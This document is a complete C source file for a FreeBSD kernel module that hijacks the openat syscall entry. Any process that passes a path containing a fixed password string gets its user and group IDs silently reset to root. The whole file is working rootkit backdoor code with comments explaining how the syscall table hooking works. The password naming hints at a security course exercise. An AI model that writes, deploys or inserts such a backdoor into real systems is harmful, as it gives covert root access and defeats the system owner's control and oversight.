/*
 * Kernel module that hijacks a pre-existing syscall.
 * Hijacked syscall will act normally unless a specific arg is given,
 * which escalates the process to root.
 */
#include <sys/param.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/proc.h>       /* thread, proc */
#include <sys/pcpu.h>       /* curthread */
#include <sys/sysent.h>     /* sysentvec, sysent, sy_call_t */

/* Escalate the current thread and its associated process to root. */
static void
escalate(struct thread *td) {

    td->td_ucred->cr_uid =          /* effective user id */
        td->td_ucred->cr_ruid =     /* real user id */
        td->td_ucred->cr_svuid =    /* saved user id */
        td->td_ucred->cr_gid =      /* effective group id */
        td->td_ucred->cr_rgid =     /* real group id */
        td->td_ucred->cr_svgid =    /* saved group id */
        0u;                         /* root id */
}

/* The system call's arguments. */
struct sc_args {
    int fd;
    char *path;
    int flag;
    mode_t mode;
};

/* Function pointer to the old syscall function that is being hijacked. */
static sy_call_t *old_sy_call = NULL;

/* New syscall that will be written to the hijack victim's syscall slot. */
static int
new_sy_call(struct thread *td, void *syscall_args) {

    int retval = (*old_sy_call)(td, syscall_args);
    /* syscall_args may be mapped to invalid addresses if the retval != 0. */
    if (retval != 0) {
        return (retval);
    }

    struct sc_args *args = (struct sc_args *) syscall_args;

#define PRIV_ESC_PASSWD "6447_priv_esc_passwd"
    if (strstr(args->path, PRIV_ESC_PASSWD) != NULL) {
        escalate(td);
    }

    return (retval);
}

/* The function called at load/unload. */
static int
load(struct module *module, int cmd, void *arg) {

    switch (cmd) {

    case MOD_LOAD:

/* 499 AUE_OPENAT_RWTC STD { int openat(int fd, char *path, int flag, mode_t mode); } */
#define HIJACKED_SYSCALL 499
        /* record the old syscall. */
        old_sy_call = curthread->td_proc->p_sysent->sv_table[HIJACKED_SYSCALL].sy_call;
        /* redirect the entry to point to the new syscall handler. */
        curthread->td_proc->p_sysent->sv_table[HIJACKED_SYSCALL].sy_call = new_sy_call;
        break;

    default:
        break;
    }

    return (0);
}

/* The second argument of DECLARE_MODULE. */
static moduledata_t hijack_mod = {
    "hijack",       /* module name */
    load,           /* event handler */
    NULL            /* extra data */
};

DECLARE_MODULE(hijack, hijack_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
